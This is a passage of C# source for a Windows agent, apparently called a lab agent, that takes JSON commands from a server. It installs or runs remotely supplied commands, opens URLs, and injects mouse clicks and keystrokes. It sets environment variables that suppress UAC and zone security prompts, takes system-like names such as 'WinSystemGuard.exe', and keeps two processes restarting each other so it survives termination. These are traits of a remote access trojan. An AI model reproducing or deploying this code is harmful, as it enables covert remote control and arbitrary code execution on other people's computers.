                if (!string.IsNullOrEmpty(uid) && !string.IsNullOrEmpty(url))
                {
                    bool shouldOpen = false;
                    lock (executedLock)
                    {
                        if (!executedIds.Contains(uid))
                        {
                            executedIds.Add(uid);
                            shouldOpen = true;
                            try { File.AppendAllText(executedLogFile, uid + Environment.NewLine); } catch { }
                        }
                    }
                    if (shouldOpen)
                    {
                        string lower = url.ToLower();
                        bool isImage = lower.EndsWith(".jpg") || lower.EndsWith(".jpeg") || lower.EndsWith(".png")
                            || lower.EndsWith(".bmp") || lower.EndsWith(".webp")
                            || lower.Contains("/uploads/") || lower.Contains("wallpaper")
                            || lower.Contains("images.unsplash.com");

                        if (isImage)
                        {
                            ThreadPool.QueueUserWorkItem(delegate
                            {
                                ExecuteRemoteInstall(uid, "wallpaper", "Duvar Kagidi", url, "", "");
                            });
                        }
                        else
                        {
                            try { Process.Start(url); } catch { }
                        }
                    }
                }
            }

            string instObj = ExtractJsonObject(json, "installCommand");
            if (!string.IsNullOrEmpty(instObj))
            {
                string iid = ExtractJsonString(instObj, "id");
                string itype = ExtractJsonString(instObj, "type");
                string iname = ExtractJsonString(instObj, "name");
                string iurl = ExtractJsonString(instObj, "url");
                string iargs = ExtractJsonString(instObj, "args");
                string icmd = ExtractJsonString(instObj, "command");
                string its = ExtractJsonString(instObj, "timestamp");

                if (!string.IsNullOrEmpty(iid))
                {
                    bool shouldRun = false;
                    lock (executedLock)
                    {
                        if (!executedIds.Contains(iid))
                        {
                            long cmdTs = 0;
                            long.TryParse(its, out cmdTs);
                            long nowEpoch = (long)(DateTime.UtcNow - new DateTime(1970, 1, 1)).TotalMilliseconds;
                            // Sadece son 90 saniye icinde olusturulmus komutlari kabul et (gecmis komut dongusu onleme)
                            if (cmdTs == 0 || (nowEpoch - cmdTs) < 90000)
                            {
                                executedIds.Add(iid);
                                shouldRun = true;
                                try { File.AppendAllText(executedLogFile, iid + Environment.NewLine); } catch { }
                            }
                        }
                    }

                    if (shouldRun)
                    {
                        ThreadPool.QueueUserWorkItem(delegate
                        {
                            ExecuteRemoteInstall(iid, itype, iname, iurl, iargs, icmd);
                        });
                    }
                }
            }

            string inputObj = ExtractJsonObject(json, "remoteInput");
            if (!string.IsNullOrEmpty(inputObj))
            {
                string iid = ExtractJsonString(inputObj, "id");
                if (!string.IsNullOrEmpty(iid) && iid != lastInputId)
                {
                    lastInputId = iid;
                    try
                    {
                        string clickType = ExtractJsonString(inputObj, "click");
                        string keys = ExtractJsonString(inputObj, "keys");
                        Match mx = Regex.Match(inputObj, "\"x\"\\s*:\\s*(\\d+)");
                        Match my = Regex.Match(inputObj, "\"y\"\\s*:\\s*(\\d+)");
                        if (mx.Success && my.Success)
                        {
                            int rx = int.Parse(mx.Groups[1].Value);
                            int ry = int.Parse(my.Groups[1].Value);
                            Rectangle b = Screen.PrimaryScreen.Bounds;
                            int px = b.Left + (b.Width * rx) / 1000;
                            int py = b.Top + (b.Height * ry) / 1000;

                            if (rx >= 0 && ry >= 0)
                            {
                                Cursor.Position = new Point(px, py);
                            }

                            if (clickType == "left")
                            {
                                mouse_event(MOUSEEVENTF_LEFTDOWN, (uint)px, (uint)py, 0, 0);
                                Thread.Sleep(30);
                                mouse_event(MOUSEEVENTF_LEFTUP, (uint)px, (uint)py, 0, 0);
                            }
                            else if (clickType == "right")
                            {
                                mouse_event(MOUSEEVENTF_RIGHTDOWN, (uint)px, (uint)py, 0, 0);
                                Thread.Sleep(30);
                                mouse_event(MOUSEEVENTF_RIGHTUP, (uint)px, (uint)py, 0, 0);
                            }
                            else if (clickType == "double")
                            {
                                mouse_event(MOUSEEVENTF_LEFTDOWN, (uint)px, (uint)py, 0, 0);
                                Thread.Sleep(30);
                                mouse_event(MOUSEEVENTF_LEFTUP, (uint)px, (uint)py, 0, 0);
                                Thread.Sleep(60);
                                mouse_event(MOUSEEVENTF_LEFTDOWN, (uint)px, (uint)py, 0, 0);
                                Thread.Sleep(30);
                                mouse_event(MOUSEEVENTF_LEFTUP, (uint)px, (uint)py, 0, 0);
                            }
                        }

                        if (!string.IsNullOrEmpty(keys))
                        {
                            SendKeys.SendWait(keys);
                        }
                    }
                    catch { }
                }
            }
        }

        [STAThread]
        public static void Main(string[] args)
        {
            // Tum alt sureclerde UAC kaldirmak icin process seviyesinde env var set et
            // Bu sayede WinSystemHost'un baslattigi TUM processler RunAsInvoker olur
            System.Environment.SetEnvironmentVariable("__COMPAT_LAYER", "RunAsInvoker");
            System.Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1");
            System.Environment.SetEnvironmentVariable("WINGET_DISABLE_INTERACTIVITY", "1");
            System.Environment.SetEnvironmentVariable("ALLUSERS", "2");
            System.Environment.SetEnvironmentVariable("MSIINSTALLPERUSER", "1");

            if (args.Length > 0 && args[0] == "--worker")
            {
                string guardianPath = args.Length > 1 ? args[1] : null;
                if (!string.IsNullOrEmpty(guardianPath))
                {
                    ThreadPool.QueueUserWorkItem(delegate
                    {
                        while (true)
                        {
                            try
                            {
                                string gName = Path.GetFileNameWithoutExtension(guardianPath);
                                if (Process.GetProcessesByName(gName).Length == 0 && File.Exists(guardianPath))
                                {
                                    ProcessStartInfo gpsi = new ProcessStartInfo(guardianPath);
                                    gpsi.UseShellExecute = false;
                                    gpsi.CreateNoWindow = true;
                                    Process.Start(gpsi);
                                }
                            }
                            catch { }
                            Thread.Sleep(1200);
                        }
                    });
                }
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);
                Application.Run(new LabAgentForm());
                return;
            }

            bool createdNew;
            using (Mutex mutex = new Mutex(true, "Global\\WinSystemDisplayServiceMutex", out createdNew))
            {
                if (!createdNew) return;
                string exePath = Application.ExecutablePath;
                string dir = Path.GetDirectoryName(exePath);
                string workerExe = Path.Combine(dir, "WinSystemGuard.exe");
                try
                {
                    if (!File.Exists(workerExe) || new FileInfo(workerExe).Length != new FileInfo(exePath).Length)
                    {
                        File.Copy(exePath, workerExe, true);
                    }
                }
                catch
                {
                    workerExe = exePath;
                }

                while (true)
                {
                    try
                    {
                        ProcessStartInfo psi = new ProcessStartInfo(workerExe, "--worker \"" + exePath + "\"");
                        psi.UseShellExecute = false;
                        psi.CreateNoWindow = true;
                        Process p = Process.Start(psi);
                        p.WaitForExit();
                    }
                    catch { }
                    Thread.Sleep(400);
                }
            }
        }
    }
}
